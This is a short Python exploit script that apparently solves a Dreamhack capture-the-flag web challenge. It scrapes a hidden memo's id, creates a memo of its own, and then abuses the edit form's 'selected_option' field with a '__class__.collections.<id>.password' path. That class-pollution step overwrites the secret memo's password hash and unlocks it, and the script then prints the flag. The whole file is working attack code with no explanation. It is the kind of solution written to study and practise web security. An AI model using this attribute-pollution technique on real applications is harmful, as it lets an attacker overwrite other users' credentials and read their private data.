import requests
import re
import hashlib
from models import *

url = "http://host8.dreamhack.games:10870/"
s = requests.Session()

def get_ids(text):
    return re.findall(r'href="\/view\/(.+)"', text)

# get secret id
res = s.get(url)

secret_id = get_ids(res.text)[0]

# create new memo
res = s.post(f'{url}/new', data={
    "title": "hacked",
    "content": "",
    "password": "hacked" 
})

# pollute class
res = s.post(f'{url}/edit/{get_ids(res.text)[-1]}', data={
    "selected_option": f"__class__.collections.{secret_id}.password",
    "edit_data": hashlib.sha256(b"hacked").hexdigest(),
    "password": "hacked"
})

# get secret
res = s.post(f'{url}/view/{secret_id}', data={"password": "hacked"})

print(re.findall(r'DH{.+}', res.text)[0])